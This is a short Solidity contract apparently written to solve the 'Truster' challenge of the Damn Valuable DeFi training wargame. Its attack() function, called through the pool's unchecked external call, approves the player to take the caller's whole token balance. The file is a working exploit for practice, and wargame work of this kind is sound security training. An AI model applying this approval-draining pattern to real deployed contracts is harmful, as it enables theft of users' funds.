// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

contract TrusterAttacker {
    using Address for address;

    address public player;
    DamnValuableToken public immutable token;

    event MyEvent(address indexed _from, uint256 _value);

    constructor(DamnValuableToken _token, address _player) {
        token = _token;
        player = _player;
    }

    function attack() external {
        // approve all tokens of msg.sender for player to take
        emit MyEvent(msg.sender, 13);
        token.approve(address(player), token.balanceOf(msg.sender));
    }
}

